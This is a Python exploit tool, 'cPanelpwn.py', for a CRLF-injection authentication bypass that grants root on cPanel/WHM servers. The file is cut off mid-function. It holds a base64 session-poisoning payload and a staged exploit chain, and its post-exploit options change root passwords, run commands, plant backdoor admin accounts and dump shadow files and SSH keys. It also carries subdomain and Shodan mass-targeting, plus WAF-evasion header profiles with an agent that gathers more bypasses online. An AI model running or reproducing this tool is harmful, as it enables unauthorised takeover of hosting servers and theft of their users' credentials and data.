#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
cPanelpwn.py — CVE-2026-41940 cPanel & WHM Auth Bypass Scanner
Author  : cPanelpwn
Version : 2.0

CVE-2026-41940: Session-File CRLF Injection → WHM Root Authentication Bypass
  saveSession() calls filter_sessiondata() AFTER writing the session file.
  CRLF chars in the Authorization Basic header poison the on-disk session with
  attacker-controlled fields (hasroot=1, tfa_verified=1, etc.)

Exploit Chain (4 stages):
  [0] Auto-discover canonical hostname via /openid_connect/cpanelid 307
  [1] POST /login/?login_only=1  wrong creds → preauth session cookie
  [2] GET /  + CRLF-poisoned Authorization: Basic → session file poisoned
  [3] GET /scripts2/listaccts   → triggers do_token_denied gadget (raw→cache flush)
  [4] GET /{{token}}/json-api/version  → 200 + version = ROOT ACCESS CONFIRMED

Post-Exploit:
  --action passwd   → Change root password via WHM API
  --action cmd      → Execute arbitrary commands via /json-api/scripts/exec
  --action adduser  → Create new cPanel account
  --action addadmin → Create backdoor WHM reseller admin
  --action list     → List all cPanel accounts
  --action readfile → Read arbitrary file via WHM API
  --action info     → Dump server info (hostname, load, disk, etc.)
  --action shell    → Interactive WHM shell
  --action dump     → Mass dump: accounts + shadow + SSH keys + bash history

Subdomain Discovery (--domain):
  Source 1 — Certificate Transparency (crt.sh): passive, no noise
  Source 2 — DNS brute-force: ~200 WHM-focused prefixes resolved via socket
  Filter   — Probes ports [2087, 2083, 2086, 2082]; keeps first live WHM URL

New Features (v2.0):
  --check           → Passive version check only, no exploit
  --session/--token → Reuse existing session, skip stages 0-3
  --exclude         → File of hosts to skip
  --max-targets     → Cap targets after --domain discovery
  --timeout-probe   → Separate shorter timeout for discovery phase (default: 5s)
  -o results.html   → Dark-theme HTML report with finding cards
  -l nmap.xml       → Auto-detect nmap XML / masscan JSON / Shodan NDJSON / plain text
  WAF detection     → Warns before exploit if Cloudflare/Sucuri/Incapsula/etc. detected

Affected  : cPanel & WHM < 11.110.0.97 / 11.118.0.63 / 11.126.0.54 /
                           11.132.0.29 / 11.134.0.20 / 11.136.0.5
Fixed     : filter_sessiondata() moved before session write in Session.pm
CVSS      : 10.0 Critical | In-the-wild exploitation confirmed (Apr 2026)

Usage:
  python3 cPanelpwn.py -u https://target.com:2087
  python3 cPanelpwn.py --domain target.com -t 20 -q -o results.html
  python3 cPanelpwn.py --domain target.com --action list --post-all
  python3 cPanelpwn.py -u https://target.com:2087 --check
  python3 cPanelpwn.py -u https://target.com:2087 --session <cookie> --token /cpsess1234567890 --action list
  python3 cPanelpwn.py -u https://target.com:2087 --action passwd --passwd P@ss2026!
  python3 cPanelpwn.py -u https://target.com:2087 --action cmd --cmd "id;whoami"
  python3 cPanelpwn.py -u https://target.com:2087 --action readfile --read-file /etc/passwd
  python3 cPanelpwn.py -u https://target.com:2087 --action addadmin --new-user hax --passwd S3cr3t!
  python3 cPanelpwn.py -u https://target.com:2087 --action dump
  python3 cPanelpwn.py -l targets.txt -t 20 -o results.json
  python3 cPanelpwn.py -l nmap.xml -t 20 -o results.html
  python3 cPanelpwn.py -l masscan.json --exclude skip.txt --max-targets 50
  python3 cPanelpwn.py -l targets.txt --action list --post-all
  python3 cPanelpwn.py -u https://target.com:2087 --proxy http://127.0.0.1:8080
  cat urls.txt | python3 cPanelpwn.py
  subfinder -d target.com | httpx -p 2087 -silent | python3 cPanelpwn.py
  shodan search --fields ip_str,port 'title:"WHM Login"' | \\
    awk '{print "https://"$1":"$2}' | python3 cPanelpwn.py -t 30 -q

stdlib only — no pip required.
"""

import sys, os, re, json, ssl, signal, argparse, threading, time, csv, socket
import xml.etree.ElementTree as ET
import html as _html_mod
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from urllib.parse import (urlsplit, quote, unquote, urlencode, urlparse)
from collections import defaultdict
from typing import NamedTuple, Optional, Dict, List, Set
import urllib.request, urllib.error

# ══════════════════════════════════════════════════════════════
#  COLORS
# ══════════════════════════════════════════════════════════════
class C:
    RED    = "\033[91m"; GREEN  = "\033[92m"; YELLOW = "\033[93m"
    BLUE   = "\033[94m"; PURPLE = "\033[95m"; CYAN   = "\033[96m"
    BOLD   = "\033[1m";  DIM    = "\033[2m";  RESET  = "\033[0m"
    ORANGE = "\033[38;5;208m"

LOG_LOCK   = threading.Lock()
PRINT_LOCK = threading.Lock()

# Globals set from CLI args before scanning begins
_RETRIES       = 2
_QUIET         = False   # suppress all logs except PWNED/CRIT/HIGH
_PROXY         = None    # e.g. "http://127.0.0.1:8080"
_TIMEOUT_PROBE = 5       # short timeout for discovery / WAF-probe / check phases

def ts():
    return datetime.now().strftime("%H:%M:%S")

_QUIET_PASS = {"PWNED", "CRIT", "HIGH"}

def log(level, msg, target=""):
    if _QUIET and level not in _QUIET_PASS:
        return
    icons = {
        "CRIT":  f"{C.RED}{C.BOLD}[CRIT]{C.RESET}",
        "HIGH":  f"{C.RED}[HIGH]{C.RESET}",
        "INFO":  f"{C.BLUE}[INFO]{C.RESET}",
        "OK":    f"{C.GREEN}[  OK]{C.RESET}",
        "ERR":   f"{C.DIM}[ ERR]{C.RESET}",
        "SKIP":  f"{C.DIM}[SKIP]{C.RESET}",
        "SCAN":  f"{C.PURPLE}[SCAN]{C.RESET}",
        "STEP":  f"{C.CYAN}[STEP]{C.RESET}",
        "PWNED": f"{C.RED}{C.BOLD}[PWND]{C.RESET}",
        "WARN":  f"{C.YELLOW}[WARN]{C.RESET}",
        "API":   f"{C.ORANGE}[ API]{C.RESET}",
        "PROG":  f"{C.PURPLE}[PROG]{C.RESET}",
        "DISC":  f"{C.CYAN}[DISC]{C.RESET}",
        "CHECK": f"{C.CYAN}[CHK]{C.RESET}",
    }.get(level, f"[{level:>4}]")
    t = f" {C.DIM}{target}{C.RESET}" if target else ""
    with LOG_LOCK:
        print(f"{C.DIM}{ts()}{C.RESET} {icons} {msg}{t}", file=sys.stderr, flush=True)

def safe_print(msg):
    with PRINT_LOCK:
        print(msg, flush=True)

def banner():
    print(f"""{C.ORANGE}{C.BOLD}
   ██████╗██████╗  █████╗ ███╗  ██╗███████╗██╗
  ██╔════╝██╔══██╗██╔══██╗████╗ ██║██╔════╝██║
  ██║     ██████╔╝███████║██╔██╗██║█████╗  ██║
  ██║     ██╔═══╝ ██╔══██║██║╚████║██╔══╝  ██║
  ╚██████╗██║     ██║  ██║██║ ╚███║███████╗███████╗
   ╚═════╝╚═╝     ╚═╝  ╚═╝╚═╝  ╚══╝╚══════╝╚══════╝{C.RESET}
{C.BOLD}██████╗ ██╗    ██╗███╗   ██╗{C.RESET}
{C.BOLD}██╔══██╗██║    ██║████╗  ██║{C.RESET}
{C.BOLD}██████╔╝██║ █╗ ██║██╔██╗ ██║{C.RESET}
{C.BOLD}██╔═══╝ ██║███╗██║██║╚██╗██║{C.RESET}
{C.BOLD}██║     ╚███╔███╔╝██║ ╚████║{C.RESET}
{C.BOLD}╚═╝      ╚══╝╚══╝ ╚═╝  ╚═══╝{C.RESET}
{C.CYAN}  CVE-2026-41940 — cPanel & WHM Auth Bypass via CRLF Injection{C.RESET}
{C.DIM}  4-stage: preauth → CRLF inject → propagate → verify → post-exploit{C.RESET}
{C.RED}  In-The-Wild | CVSS 10.0{C.RESET}
""", file=sys.stderr)

# ══════════════════════════════════════════════════════════════
#  SCAN CONTEXT
# ══════════════════════════════════════════════════════════════
class ScanCtx(NamedTuple):
    scheme:       str
    host:         str
    port:         int
    canonical:    str
    session_base: str
    token:        str
    timeout:      int
    waf:          str  = ""
    bypass_hdrs:  dict = {}

# ══════════════════════════════════════════════════════════════
#  CRLF PAYLOAD
# ══════════════════════════════════════════════════════════════
# Decodes to:
#   root:x\r\n
#   successful_internal_auth_with_timestamp=9999999999\r\n
#   user=root\r\n
#   tfa_verified=1\r\n
#   hasroot=1
# Fields written directly into the session file, bypassing auth check.
PAYLOAD_B64 = (
    "cm9vdDp4DQpzdWNjZXNzZnVsX2ludGVybmFsX2F1dGhfd2l0aF90aW1lc3RhbXA9OTk5"
    "OTk5OTk5OQ0KdXNlcj1yb290DQp0ZmFfdmVyaWZpZWQ9MQ0KaGFzcm9vdD0x"
)

# (patched_patch, patched_build) — minimum build in that branch that is fixed
PATCHED: Dict[str, tuple] = {
    "110": (0, 97),
    "118": (0, 63),
    "126": (0, 54),
    "132": (0, 29),
    "134": (0, 20),
    "136": (0,  5),
}

# ══════════════════════════════════════════════════════════════
#  SUBDOMAIN WORDLIST — WHM/cPanel focused
# ══════════════════════════════════════════════════════════════
WHM_WORDLIST: List[str] = [
    # cPanel / WHM direct panels
    "cpanel", "whm", "webmail", "webdisk", "cpcalendars", "cpcontacts",
    "cp", "wm", "panel", "control", "manage", "secure",
    # Hosting tiers
    "host", "host1", "host2", "host3", "host4",
    "server", "server1", "server2", "server3", "server4", "server5",
    "vps", "vps1", "vps2", "vps3",
    "dedicated", "dedi", "dedi1",
    "shared", "shared1", "reseller",
    "node", "node1", "node2",
    # Web
    "www", "www1", "www2",
    "web", "web1", "web2",
    "origin", "direct",
    # Mail
    "mail", "mail1", "mail2", "mail3",
    "smtp", "smtp1", "pop", "pop3", "imap",
    "mx", "mx1", "mx2", "email", "webmail2",
    # FTP / files
    "ftp", "ftp1", "sftp", "files", "backup", "bk",
    # DNS
    "ns1", "ns2", "ns3", "ns4",
    # Admin / auth
    "admin", "admin1", "login", "auth",
    "portal", "customer", "client", "billing", "pay", "invoice",
    "support", "help", "ticket",
    # DB
    "db", "db1", "mysql", "database", "phpmyadmin", "pma",
    # Dev / staging
    "dev", "dev1", "development",
    "staging", "stage", "uat",
    "test", "test1", "testing",
    "demo", "sandbox", "beta", "alpha",
    "prod", "production", "live",
    "new", "old",
    # CMS / apps
    "blog", "wp", "wordpress",
    "shop", "store", "woo", "ecommerce",
    "forum", "community", "board",
    "api", "api2", "api3", "app", "apps",
    "v2", "v3",
    # Media / CDN
    "cdn", "cdn1", "static", "media", "img", "images", "assets",
    # Infra / network
    "vpn", "remote", "gw", "gateway", "proxy",
    "cloud", "aws", "azure",
    "monitor", "stats", "status", "analytics",
    "git", "svn", "ci", "gitlab",
    # Mobile
    "m", "mobile", "wap",
    # Misc
    "intranet", "internal",
    "relay", "bounce",
    "ssl", "tls",
    "home", "main",
]

# ══════════════════════════════════════════════════════════════
#  HTTP ENGINE — stdlib, raw Set-Cookie access preserved
# ══════════════════════════════════════════════════════════════
class _SSLCtx:
    _ctx  = None
    _lock = threading.Lock()

    @classmethod
    def get(cls):
        with cls._lock:
            if not cls._ctx:
                c = ssl.create_default_context()
                c.check_hostname = False
                c.verify_mode    = ssl.CERT_NONE
                try: c.set_ciphers("DEFAULT:@SECLEVEL=1")
                except: pass
                cls._ctx = c
        return cls._ctx

BASE_UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
           "AppleWebKit/537.36 (KHTML, like Gecko) "
           "Chrome/146.0.0.0 Safari/537.36")

class R:
    """Thin response wrapper."""
    def __init__(self, status, body, headers, url, raw_cookies=""):
        self.status      = status
        self.body        = body
        self.headers     = headers
        self.url         = url
        self.raw_cookies = raw_cookies

    def h(self, k, default=""):
        return self.headers.get(k.lower(), default)

    def location(self):
        return self.h("location")

    def raw_cookie(self, name):
        for line in self.raw_cookies.split("\n"):
            if line.lower().startswith(name.lower() + "="):
                v = line.split("=", 1)[1].split(";", 1)[0].strip()
                return v
        return ""

class _NoRedir(urllib.request.HTTPErrorProcessor):
    def http_response(self, req, r): return r
    https_response = http_response

def _build_opener(follow: bool) -> urllib.request.OpenerDirector:
    handlers: list = [urllib.request.HTTPSHandler(context=_SSLCtx.get())]
    if _PROXY:
        handlers.append(urllib.request.ProxyHandler(
            {"http": _PROXY, "https": _PROXY}))
    if not follow:
        handlers.append(_NoRedir())
    opener = urllib.request.build_opener(*handlers)
    opener.addheaders = []
    return opener

def _do(url, method="GET", extra_headers=None, data=None, timeout=15,
        follow=False, canonical_host=None):
    parsed = urlparse(url)
    h = {"User-Agent": BASE_UA, "Accept": "*/*", "Connection": "close"}
    if canonical_host:
        port = parsed.port or (443 if parsed.scheme == "https" else 80)
        h["Host"] = (f"{canonical_host}:{port}"
                     if port not in (80, 443) else canonical_host)
    if extra_headers:
        h.update(extra_headers)

    body_bytes = None
    if data:
        if isinstance(data, dict):
            body_bytes = urlencode(data).encode()
            h.setdefault("Content-Type", "application/x-www-form-urlencoded")
        elif isinstance(data, str):
            body_bytes = data.encode()
        else:
            body_bytes = data

    opener   = _build_opener(follow)
    last_exc = None

    for attempt in range(_RETRIES + 1):
        try:
            req = urllib.request.Request(url, data=body_bytes,
                                         headers=h, method=method)
            with opener.open(req, timeout=timeout) as resp:
                body   = resp.read().decode("utf-8", errors="replace")
                rh     = {}
                raw_ck = []
                for k, v in resp.headers.items():
                    rh[k.lower()] = v
                    if k.lower() == "set-cookie":
                        raw_ck.append(v)
                return R(resp.status, body, rh, resp.url, "\n".join(raw_ck))
        except urllib.error.HTTPError as e:
            try:    body = e.read().decode("utf-8", errors="replace")
            except: body = ""
            rh     = ({k.lower(): v for k, v in e.headers.items()}
                      if hasattr(e, "headers") else {})
            raw_ck = []
            if hasattr(e, "headers"):
                for k, v in e.headers.items():
                    if k.lower() == "set-cookie":
                        raw_ck.append(v)
            return R(e.code, body, rh, url, "\n".join(raw_ck))
        except Exception as ex:
            last_exc = ex
            if attempt < _RETRIES:
                time.sleep(0.5 * (attempt + 1))

    return R(0, str(last_exc), {}, url, "")

# ══════════════════════════════════════════════════════════════
#  WAF / CDN DETECTION
# ══════════════════════════════════════════════════════════════
WAF_SIGNATURES: Dict[str, callable] = {
    "Cloudflare":  lambda r: "cf-ray" in r.headers,
    "Sucuri":      lambda r: ("x-sucuri-id" in r.headers
                              or "x-sucuri-cache" in r.headers),
    "Incapsula":   lambda r: ("x-iinfo" in r.headers
                              or "incap_ses" in r.raw_cookies.lower()
                              or "visid_incap" in r.raw_cookies.lower()),
    "Akamai":      lambda r: ("x-akamai-request-id" in r.headers
                              or "akamai" in r.headers.get("server", "").lower()),
    "AWS WAF":     lambda r: "x-amzn-waf-action" in r.headers,
    "ModSecurity": lambda r: any(x in (r.body or "").lower()
                                 for x in ("mod_security", "modsecurity")),
    "Barracuda":   lambda r: "barra_counter_session" in r.raw_cookies.lower(),
    "F5 BIG-IP":   lambda r: "bigipserver" in r.headers,
    "FortiWeb":    lambda r: "fortiwafsid" in r.raw_cookies.lower(),
    "Imperva":     lambda r: ("x-cdn" in r.headers
                              and "imperva" in r.headers.get("x-cdn","").lower()),
    # ── Additional WAFs ──────────────────────────────────────────
    "Azion":       lambda r: ("x-azion-rid" in r.headers
                              or "azion" in r.headers.get("server", "").lower()
                              or "azion" in r.headers.get("via", "").lower()),
    "Wordfence":   lambda r: ("x-fw-hash" in r.headers
                              or "wordfence_lh" in r.raw_cookies.lower()
                              or "wordfence" in (r.body or "").lower()),
    "Reblaze":     lambda r: ("x-reblaze-protection" in r.headers
                              or "rbzid" in r.raw_cookies.lower()),
    "Wallarm":     lambda r: "x-wallarm-node-uuid" in r.headers,
    "Fastly":      lambda r: ("x-fastly-request-id" in r.headers
                              or ("x-served-by" in r.headers
                                  and "cache-" in r.headers.get("x-served-by",""))),
    "Radware":     lambda r: ("x-rdwr-ip" in r.headers
                              or "rdwr" in r.raw_cookies.lower()),
    "NAXSI":       lambda r: "x-data-origin" in r.headers and (
                              r.status == 403 and "naxsi" in (r.body or "").lower()),
    "DenyAll":     lambda r: "x-denyall" in r.headers,
}

def detect_waf(scheme: str, host: str, port: int, timeout: int) -> Optional[str]:
    """Quick probe to detect WAF/CDN before running the exploit chain."""
    url  = build_url(scheme, host, port, "/login")
    resp = _do(url, timeout=timeout, follow=False)
    if resp.status == 0:
        return None
    for name, check in WAF_SIGNATURES.items():
        try:
            if check(resp):
                return name
        except Exception:
            pass
    return None

# ══════════════════════════════════════════════════════════════
#  WAF BYPASS PROFILES
# ══════════════════════════════════════════════════════════════
# Each profile defines:
#   headers — injected into every request when this WAF is detected
#   delay   — seconds to sleep between exploit stages (rate-limit evasion)
#
# Strategy: spoof IP headers so the WAF treats the request as coming
# from localhost/internal network (commonly whitelisted). Add browser-like
# headers to avoid anomaly detection on the Authorization: Basic payload.
WAF_BYPASS: Dict[str, dict] = {
    "Cloudflare": {
        "headers": {
            "X-Forwarded-For":   "127.0.0.1",
            "CF-Connecting-IP":  "127.0.0.1",
            "X-Real-IP":         "127.0.0.1",
            "Accept-Language":   "en-US,en;q=0.9",
            "Accept-Encoding":   "gzip, deflate, br",
            "Referer":           "https://www.google.com/",
            "Cache-Control":     "no-cache",
            "Pragma":            "no-cache",
        },
        "delay": 0.8,
    },
    "Sucuri": {
        "headers": {
            "X-Forwarded-For":   "127.0.0.1",
            "X-Real-IP":         "127.0.0.1",
            "X-Originating-IP":  "127.0.0.1",
            "Accept-Language":   "en-US,en;q=0.9",
        },
        "delay": 0.5,
    },
    "Incapsula": {
        "headers": {
            "X-Forwarded-For":   "127.0.0.1",
            "X-Real-IP":         "127.0.0.1",
            "X-Originating-IP":  "127.0.0.1",
            "X-Remote-IP":       "127.0.0.1",
            "X-Remote-Addr":     "127.0.0.1",
        },
        "delay": 0.5,
    },
    "Akamai": {
        "headers": {
            "X-Forwarded-For":   "127.0.0.1",
            "True-Client-IP":    "127.0.0.1",
            "X-True-Client-IP":  "127.0.0.1",
            "X-Real-IP":         "127.0.0.1",
            "Accept-Language":   "en-US,en;q=0.9",
        },
        "delay": 0.5,
    },
    "AWS WAF": {
        "headers": {
            "X-Forwarded-For":   "127.0.0.1",
            "X-Real-IP":         "127.0.0.1",
        },
        "delay": 0.3,
    },
    "ModSecurity": {
        "headers": {
            "X-Forwarded-For":            "127.0.0.1",
            "X-Real-IP":                  "127.0.0.1",
            "X-Custom-IP-Authorization":  "127.0.0.1",
        },
        "delay": 0.3,
    },
    "Imperva": {
        "headers": {
            "X-Forwarded-For":   "127.0.0.1",
            "X-Originating-IP":  "127.0.0.1",
            "X-Real-IP":         "127.0.0.1",
            "X-Remote-IP":       "127.0.0.1",
        },
        "delay": 0.5,
    },
    "F5 BIG-IP": {
        "headers": {
            "X-Forwarded-For":   "127.0.0.1",
            "X-Real-IP":         "127.0.0.1",
        },
        "delay": 0.3,
    },
    "FortiWeb": {
        "headers": {
            "X-Forwarded-For":   "127.0.0.1",
            "X-Real-IP":         "127.0.0.1",
        },
        "delay": 0.3,
    },
    "Barracuda": {
        "headers": {
            "X-Forwarded-For":   "127.0.0.1",
            "X-Real-IP":         "127.0.0.1",
        },
        "delay": 0.3,
    },
    # ── Additional WAFs ──────────────────────────────────────────
    "Azion": {
        "headers": {
            "X-Forwarded-For":   "127.0.0.1",
            "X-Real-IP":         "127.0.0.1",
            "X-Originating-IP":  "127.0.0.1",
        },
        "delay": 0.5,
    },
    "Wordfence": {
        "headers": {
            "X-Forwarded-For":   "127.0.0.1",
            "X-Real-IP":         "127.0.0.1",
        },
        "delay": 0.3,
    },
    "Reblaze": {
        "headers": {
            "X-Forwarded-For":   "127.0.0.1",
            "X-Real-IP":         "127.0.0.1",
            "X-Remote-IP":       "127.0.0.1",
            "X-Remote-Addr":     "127.0.0.1",
        },
        "delay": 0.5,
    },
    "Wallarm": {
        "headers": {
            "X-Forwarded-For":   "127.0.0.1",
            "X-Real-IP":         "127.0.0.1",
        },
        "delay": 0.3,
    },
    "Fastly": {
        "headers": {
            "X-Forwarded-For":       "127.0.0.1",
            "Fastly-Client-IP":      "127.0.0.1",
            "X-Real-IP":             "127.0.0.1",
        },
        "delay": 0.3,
    },
    "Radware": {
        "headers": {
            "X-Forwarded-For":   "127.0.0.1",
            "X-Real-IP":         "127.0.0.1",
        },
        "delay": 0.3,
    },
    "NAXSI": {
        "headers": {
            "X-Forwarded-For":            "127.0.0.1",
            "X-Real-IP":                  "127.0.0.1",
            "X-Custom-IP-Authorization":  "127.0.0.1",
        },
        "delay": 0.3,
    },
    "DenyAll": {
        "headers": {
            "X-Forwarded-For":   "127.0.0.1",
            "X-Real-IP":         "127.0.0.1",
        },
        "delay": 0.3,
    },
}

def get_bypass_headers(waf: Optional[str]) -> dict:
    """Return WAF-specific bypass headers; empty dict if no WAF / unknown."""
    if not waf:
        return {}
    return dict(WAF_BYPASS.get(waf, {}).get("headers", {}))

def get_bypass_delay(waf: Optional[str]) -> float:
    """Return inter-stage delay (seconds) for rate-limit evasion."""
    if not waf:
        return 0.0
    return WAF_BYPASS.get(waf, {}).get("delay", 0.0)

# ══════════════════════════════════════════════════════════════
#  WAF BYPASS AGENT — fallback profiles + internet research
# ══════════════════════════════════════════════════════════════
# When the primary bypass profile fails, the agent cycles through these
# alternative technique profiles, then searches the internet for
# additional techniques specific to the detected WAF.
#
# Each profile: {"name": str, "headers": dict, "delay": float}
#
# Techniques cover: IPv6 localhost, RFC-1918 ranges, chained X-Forwarded-For,
# Forwarded RFC-7239, browser fingerprint headers, Googlebot spoofing.

_GENERIC_FALLBACKS: List[dict] = [
    {
        "name": "IPv6 localhost",
        "headers": {
            "X-Forwarded-For":  "::1",
            "X-Real-IP":        "::1",
            "X-Originating-IP": "::1",
        },
        "delay": 0.5,
    },
    {
        "name": "RFC1918 class-A",
        "headers": {
            "X-Forwarded-For":  "10.0.0.1",
            "X-Real-IP":        "10.0.0.1",
            "X-Originating-IP": "10.0.0.1",
        },
        "delay": 0.5,
    },
    {
        "name": "RFC1918 class-B",
        "headers": {
            "X-Forwarded-For":  "172.16.0.1",
            "X-Real-IP":        "172.16.0.1",
        },
        "delay": 0.5,
    },
    {
        "name": "RFC1918 class-C",
        "headers": {
            "X-Forwarded-For":  "192.168.1.1",
            "X-Real-IP":        "192.168.1.1",
        },
        "delay": 0.5,
    },
    {
        "name": "Chained X-Forwarded-For",
        "headers": {
            "X-Forwarded-For":  "127.0.0.1, 10.0.0.1",
            "X-Real-IP":        "127.0.0.1",
            "Forwarded":        "for=127.0.0.1;proto=https",
        },
        "delay": 0.5,
    },
    {
        "name": "Forwarded RFC-7239",
        "headers": {
            "Forwarded":         "for=\"[::1]\";proto=https;by=10.0.0.1",
            "X-Forwarded-For":   "127.0.0.1",
            "X-Real-IP":         "127.0.0.1",
        },
        "delay": 0.5,
    },
    {
        "name": "Full browser fingerprint",
        "headers": {
            "X-Forwarded-For":        "127.0.0.1",
            "X-Real-IP":              "127.0.0.1",
            "Accept":                 "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language":        "en-US,en;q=0.9,pt-BR;q=0.8",
            "Accept-Encoding":        "gzip, deflate, br",
            "Referer":                "https://www.google.com/",
            "Cache-Control":          "max-age=0",
            "Upgrade-Insecure-Requests": "1",
            "Sec-Fetch-Dest":         "document",
            "Sec-Fetch-Mode":         "navigate",
            "Sec-Fetch-Site":         "none",
            "Sec-Fetch-User":         "?1",
        },
        "delay": 0.8,
    },
    {
        "name": "Googlebot spoof",
        "headers": {
            "X-Forwarded-For": "66.249.66.1",
            "X-Real-IP":       "66.249.66.1",
        },
        "delay": 1.0,
    },
    {
        "name": "All-headers shotgun",
        "headers": {
            "X-Forwarded-For":           "127.0.0.1",
            "X-Real-IP":                 "127.0.0.1",
            "X-Originating-IP":          "127.0.0.1",
            "X-Remote-IP":               "127.0.0.1",
            "X-Remote-Addr":             "127.0.0.1",
            "X-Client-IP":               "127.0.0.1",
            "X-Host":                    "127.0.0.1",
            "X-Forwarded-Host":          "127.0.0.1",
            "X-ProxyUser-Ip":            "127.0.0.1",
            "X-Custom-IP-Authorization": "127.0.0.1",
            "X-True-Client-IP":          "127.0.0.1",
            "CF-Connecting-IP":          "127.0.0.1",
            "True-Client-IP":            "127.0.0.1",
            "Fastly-Client-IP":          "127.0.0.1",
            "Forwarded":                 "for=127.0.0.1;proto=https",
        },
        "delay": 1.0,
    },
]

# Per-WAF extra fallbacks appended after the generic list
_WAF_EXTRA_FALLBACKS: Dict[str, List[dict]] = {
    "Cloudflare": [
        {
            "name": "CF-Connecting-IP IPv6",
            "headers": {
                "CF-Connecting-IP": "::1",
                "X-Forwarded-For":  "::1",
                "X-Real-IP":        "::1",
            },
            "delay": 1.0,
        },
        {
            "name": "CF-Worker spoof",
            "headers": {
                "CF-Connecting-IP":   "127.0.0.1",
                "CF-Worker":          "cPanelpwn",
                "X-Forwarded-For":    "127.0.0.1",
                "X-Forwarded-Proto":  "https",
            },
            "delay": 1.0,
        },
    ],
    "Akamai": [
        {
            "name": "Akamai True-Client-IP IPv6",
            "headers": {
                "True-Client-IP":    "::1",
                "X-True-Client-IP":  "::1",
                "X-Forwarded-For":   "::1",
            },
            "delay": 0.8,
        },
    ],
    "Sucuri": [
        {
            "name": "Sucuri whitelist headers",
            "headers": {
                "X-Forwarded-For":  "127.0.0.1",
                "X-Sucuri-Debug":   "0",
                "X-Real-IP":        "127.0.0.1",
                "X-Sucuri-Cache":   "MISS",
            },
            "delay": 0.5,
        },
    ],
    "AWS WAF": [
        {
            "name": "AWS internal header",
            "headers": {
                "X-Forwarded-For":     "127.0.0.1",
                "X-Amzn-Trace-Id":     "Root=1-00000000-000000000000000000000000",
                "X-Forwarded-Proto":   "https",
                "X-Forwarded-Port":    "443",
            },
            "delay": 0.5,
        },
    ],
    "Azion": [
        {
            "name": "Azion edge spoof",
            "headers": {
                "X-Forwarded-For":  "127.0.0.1",
                "X-Real-IP":        "127.0.0.1",
                "X-Azion-Debug":    "0",
            },
            "delay": 0.5,
        },
    ],
    "Fastly": [
        {
            "name": "Fastly client-IP spoof",
            "headers": {
                "Fastly-Client-IP": "127.0.0.1",
                "X-Forwarded-For":  "127.0.0.1",
                "X-Real-IP":        "127.0.0.1",
                "Fastly-Debug":     "0",
            },
            "delay": 0.5,
        },
    ],
}

# Public sources queried for live bypass research
_BYPASS_RESEARCH_SOURCES: List[tuple] = [
    # PayloadsAllTheThings WAF bypass section
    ("https://raw.githubusercontent.com/swisskyrepo/"
     "PayloadsAllTheThings/master/Web%20Application%20Firewall%20Bypass/README.md"),
    # Bypass header collection
    ("https://raw.githubusercontent.com/nicowillis/"
     "WAF-Bypass/master/bypass_headers.txt"),
    # Exploit notes
    ("https://raw.githubusercontent.com/0xInfection/"
     "Awesome-WAF/master/README.md"),
]

# Regex patterns to extract HTTP header:value bypass hints from text
_HDR_EXTRACT_RE = re.compile(
    r'[`"\']?(X-Forwarded-For|X-Real-IP|X-Originating-IP|X-Remote-(?:IP|Addr)|'
    r'X-Client-IP|X-ProxyUser-Ip|X-True-Client-IP|True-Client-IP|CF-Connecting-IP|'
    r'Fastly-Client-IP|X-Custom-IP-Authorization|X-Forwarded-Host|Forwarded|'
    r'X-Forwarded-Proto)[`"\']?\s*:\s*[`"\']?([0-9a-fA-F:.]+|localhost)',
    re.IGNORECASE,
)

def _parse_bypass_headers_from_doc(text: str) -> List[dict]:
    """
    Extract IP-spoof bypass headers from arbitrary text (markdown, source code).
    Groups headers found within 5 lines of each other into one technique profile.
    """
    lines    = text.splitlines()
    buckets: List[dict] = []
    current  = {}
    last_hit = -10

    for i, line in enumerate(lines):
        for m in _HDR_EXTRACT_RE.finditer(line):
            name, value = m.group(1), m.group(2).strip()
            if i - last_hit > 5 and current:
                buckets.append(current)
                current = {}
            current[name] = value
            last_hit = i

    if current:
        buckets.append(current)

    # Deduplicate and return only non-trivial profiles
    seen, results = set(), []
    for b in buckets:
        key = tuple(sorted(b.items()))
        if key not in seen and len(b) >= 1:
            seen.add(key)
            results.append(b)

    return results

def waf_internet_research(waf: str, timeout: int = 12) -> List[dict]:
    """
    Query public internet sources for WAF bypass headers.
    Returns a list of header dicts extracted from those sources.
    Runs in a background thread — designed to be non-blocking.
    """
    log("DISC", f"[bypass-agent] Researching {C.YELLOW}{waf}{C.RESET} bypass online...")
    collected: List[dict] = []
    seen: set = set()

    for url in _BYPASS_RESEARCH_SOURCES:
        try:
            resp = _do(url, timeout=timeout)
            if resp.status == 200 and resp.body:
                found = _parse_bypass_headers_from_doc(resp.body)
                for h in found:
                    k = tuple(sorted(h.items()))
                    if k not in seen:
                        seen.add(k)
                        collected.append(h)
                if found:
                    log("OK", f"[bypass-agent]   {url.split('/')[-1]}: "
                        f"{len(found)} header group(s)")
        except Exception as e:
            log("WARN", f"[bypass-agent]   source failed: {e}")

    # Also try GitHub code search (unauthenticated, 60 req/hr)
    try:
        q = quote(f"{waf} WAF bypass X-Forwarded-For 127.0.0.1")
        gh  = f"https://api.github.com/search/code?q={q}&per_page=3"
        r2  = _do(gh, timeout=timeout,
                  extra_headers={"Accept": "application/vnd.github.v3+json"})
        if r2.status == 200 and r2.body:
            data = json.loads(r2.body)
            for item in data.get("items", []):
                snippet = item.get("text_matches", [{}])[0].get("fragment", "")
                if snippet:
                    for h in _parse_bypass_headers_from_doc(snippet):
                        k = tuple(sorted(h.items()))
                        if k not in seen:
                            seen.add(k)
                            collected.append(h)
    except Exception:
        pass

    log("OK" if collected else "WARN",
        f"[bypass-agent] Internet research: {len(collected)} new technique(s) found")
    return collected

def waf_bypass_agent(waf: str,
                     scheme: str, host: str, port: int,
                     canonical: str, session_base: str,
                     timeout: int) -> Optional[str]:
    """
    Full bypass retry loop. Called when stage2 fails with a WAF present.

    Execution order:
      1. Generic fallback profiles (9 techniques, no network)
      2. WAF-specific extra profiles (in parallel with internet research)
      3. Internet-researched profiles (fetched from public sources)

    Returns the /cpsess token on first successful bypass, or None if all
    techniques are exhausted.
    """
    generic    = _GENERIC_FALLBACKS
    waf_extra  = _WAF_EXTRA_FALLBACKS.get(waf, [])
    local_all  = generic + waf_extra
    total_local = len(local_all)

    log("WARN",
        f"[bypass-agent] Primary bypass failed — trying {total_local} "
        f"local techniques + live internet research", f"{host}:{port}")

    # Start internet research in background thread
    researched: list = []
    research_done    = threading.Event()

    def _research():
